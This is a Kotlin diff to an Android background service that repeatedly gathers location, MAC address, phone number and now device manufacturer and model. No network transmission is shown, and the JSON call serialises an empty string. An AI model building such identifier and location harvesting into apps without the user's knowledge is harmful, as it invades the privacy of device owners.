@@ -7,6 +7,7 @@ import android.content.Intent
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
+import android.os.Build
 import android.os.Bundle
 import android.os.IBinder
 import android.os.Looper
@@ -47,10 +48,13 @@ class Service : Service() {
             val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
             var telNumber = tm.line1Number
             telNumber = sanitizerTel.replace(telNumber, "")
+            telNumber = telNumber.replace("\\s".toRegex(), "")
 
             var location = getLocation()
             location.add(macAddress)
             location.add(telNumber)
+            location.add(getDeviceManufacturer())
+            location.add(getDeviceModel())
 
             val json = Gson().toJson("")
 
@@ -62,6 +66,18 @@ class Service : Service() {
             Thread.sleep(1000) // 3600000
         }
         Looper.loop()
+    }
+
+    fun getDeviceModel(): String {
+        var model = Build.MODEL
+        model = model.replace("\\s".toRegex(), "")
+        return model.toUpperCase()
+    }
+
+    fun getDeviceManufacturer(): String {
+        var manufacturer = Build.MANUFACTURER
+        manufacturer = manufacturer.replace("\\s".toRegex(), "")
+        return manufacturer.toUpperCase()
     }
 
     fun getMacAddress(): String {
